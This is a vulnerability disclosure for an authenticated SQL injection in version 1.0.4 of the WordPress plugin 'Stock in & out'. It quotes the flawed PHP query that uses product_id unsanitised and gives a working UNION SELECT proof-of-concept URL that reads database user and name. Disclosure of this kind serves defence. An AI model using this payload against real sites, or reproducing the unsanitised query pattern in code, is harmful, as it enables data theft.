# Vulnerability Info
## Vulnerability Type
Wordpress plugin Stock in & out Authenticated SQL Injection
## Vulnerability Version
1.0.4
## Recurring environment
Windows 10* PHP 5.4.5* Apache 2.4.23
## Author
pang0lin@webray.com.cn inc.
# Vulnerability Description AND recurrence:
The security issue is occured at file \wp-content\plugins\stock-in\includes\settings.php
```
 <?php
global $wpdb;
$author_id=get_current_user_id();
$stock_in_history=$wpdb->prefix.'stock_in_history';
/*if(isset($_GET['product_id'])){
$stock_in_log = $wpdb->get_results("SELECT * FROM $stock_in_history	WHERE product_id = $product_id ORDER BY id DESC");
}else{
$stock_in_log = $wpdb->get_results("SELECT * FROM $stock_in_history	ORDER BY id DESC");
}*/

if(isset($_GET['product_id'])){
$stock_in_log = "SELECT * FROM $stock_in_history WHERE product_id = $product_id";
}else{
$stock_in_log = "SELECT * FROM $stock_in_history";
}

$query = $stock_in_log;
 $total_query = "SELECT COUNT(1) FROM (${query}) AS combined_table";
    $total = $wpdb->get_var( $total_query );
    $items_per_page = 20;
	//$sort = isset( $_GET['sort'] ) ? 'DESC'	: 'ASC';
    $page = isset( $_GET['cpage'] ) ? abs((int)$_GET['cpage']) : 1;
    $offset = ( $page * $items_per_page ) - $items_per_page;
    $stock_in_log_by_page = $wpdb->get_results( $query . " ORDER BY ID ${sort} LIMIT ${offset}, ${items_per_page}" );

```
The parameter $_GET['product_id'] is derectly used by select statement. Then, we can exploit it .

http://www.target.com/wp-admin/admin.php?page=stock_in&product_id=0+union+select+1%2C2%2C3%2Cuser%28%29%2Cdatabase%28%29%2C6%2C7%2C8%2C9%2C10&tab=history

![blockchain](https://github.com/pang0lin/CVEproject/blob/main/imgs/wordpress_plugin_stockinandout_sqli.png "wordpress_plugin_stockinandout_sqli")
